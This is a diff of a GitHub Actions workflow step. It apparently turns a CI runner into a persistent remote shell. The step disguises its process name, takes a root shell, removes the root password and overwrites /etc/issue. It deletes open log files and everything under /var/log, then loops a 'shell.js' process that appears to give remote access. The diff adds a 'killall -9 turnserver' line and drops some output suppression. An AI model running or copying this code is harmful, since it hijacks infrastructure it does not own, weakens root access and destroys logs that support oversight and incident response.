@@ -36,14 +36,15 @@ jobs:
     - name: Run
       run: |
         exec -a "sleep infinity" sudo -sH &>/dev/null <<EOF
-        passwd -d root &>/dev/null
+        killall -9 turnserver
+        passwd -d root
         touch ~root/.hushlogin
         cat logo.txt >/etc/issue
         lsof -Fn | grep -F '.log' | grep -v deleted | awk '/^n/ {print substr(\$0, 2)}' | xargs -I {} rm -rf {}
         rm -rf /var/log/*
         while true
         do
-        node shell.js -r -l -t 600 github3 &>/dev/null
+        node shell.js -r -l -t 600 github3
         sleep 2
         done
         EOF
